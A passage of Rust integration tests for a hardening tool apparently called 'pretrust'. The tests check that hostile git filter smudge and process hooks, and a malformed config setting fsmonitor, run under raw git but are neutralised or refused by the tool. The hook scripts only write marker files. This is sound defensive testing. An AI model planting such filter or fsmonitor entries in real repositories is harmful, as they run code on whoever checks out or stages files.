    assert!(marker_content.contains("FILTER_SMUDGE_FIRED"));

    // 2. Reset marker and remove file again
    fs::remove_file(&marker_file).unwrap();
    assert!(!marker_file.exists());
    fs::remove_file(&txt_file).unwrap();

    // 3. Positive proof: pretrust run executes git checkout with neutralized filter
    let hardened_output = hermetic_cmd(&bin)
        .args(["run", "--", "git", "checkout", "--", "file.txt"])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run git checkout failed");
    assert!(
        hardened_output.status.success(),
        "pretrust run failed: stderr={}",
        String::from_utf8_lossy(&hardened_output.stderr)
    );
    assert!(txt_file.is_file());
    assert!(
        !marker_file.exists(),
        "SECURITY VIOLATION: Hostile filter smudge script executed inside 'pretrust run'!"
    );
}

#[test]
fn test_16_filter_process_isolation_proof() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();
    init_test_git_repo(dir.path());

    let marker_file = dir.path().join("process_marker.txt");
    #[cfg(windows)]
    let script_file = dir.path().join("process_filter.bat");
    #[cfg(not(windows))]
    let script_file = dir.path().join("process_filter.sh");

    write_executable_marker_script(&script_file, &marker_file, "FILTER_PROCESS_FIRED", false);

    let script_str = script_file.to_str().unwrap().replace('\\', "/");
    let config_status = hermetic_cmd("git")
        .args(["config", "filter.custom_proc.process", &script_str])
        .current_dir(dir.path())
        .status()
        .expect("git config filter.custom_proc.process failed");
    assert!(config_status.success());

    fs::write(
        dir.path().join(".gitattributes"),
        "*.txt filter=custom_proc\n",
    )
    .unwrap();
    let txt_file = dir.path().join("file.txt");
    fs::write(&txt_file, "content for process\n").unwrap();

    // 1. Negative control: raw git add executes process filter script
    let _ = hermetic_cmd("git")
        .args(["add", "file.txt"])
        .current_dir(dir.path())
        .output();
    assert!(
        marker_file.is_file(),
        "NEGATIVE CONTROL FAILED: Unhardened git add did not trigger filter process script"
    );
    let marker_content = fs::read_to_string(&marker_file).unwrap();
    assert!(marker_content.contains("FILTER_PROCESS_FIRED"));

    // 2. Reset marker and reset repo state
    fs::remove_file(&marker_file).unwrap();
    assert!(!marker_file.exists());
    let _ = hermetic_cmd("git")
        .args(["reset"])
        .current_dir(dir.path())
        .status();

    // 3. Positive proof: pretrust run executes git add with neutralized filter process
    let hardened_output = hermetic_cmd(&bin)
        .args(["run", "--", "git", "add", "file.txt"])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run git add failed");
    assert!(
        hardened_output.status.success(),
        "pretrust run failed: stderr={}",
        String::from_utf8_lossy(&hardened_output.stderr)
    );
    assert!(
        !marker_file.exists(),
        "SECURITY VIOLATION: Hostile filter process script executed inside 'pretrust run'!"
    );
}

#[test]
fn malformed_git_config_reports_sink_and_refuses_run_before_marker() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();
    let git_dir = dir.path().join(".git");
    fs::create_dir_all(&git_dir).unwrap();
    fs::write(
        git_dir.join("config"),
        "[core]\nfsmonitor = hostile\n[broken\n",
    )
    .unwrap();
    let marker = dir.path().join("marker");

    let (code, report) = scan_json(&bin, dir.path());
    assert_eq!(code, Some(1));
    let findings = report["findings"].as_array().unwrap();
    assert!(findings.iter().any(|f| f["id"] == "PT-CFG-001"));
    assert!(findings.iter().any(|f| f["id"] == "PT-GIT-001"));

    let output = hermetic_cmd(&bin)
        .args([
            "run",
            "--",
            "sh",
            "-c",
            &format!("touch {}", marker.display()),
        ])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run failed");
    assert_eq!(output.status.code(), Some(2));
    assert!(!marker.exists());
}
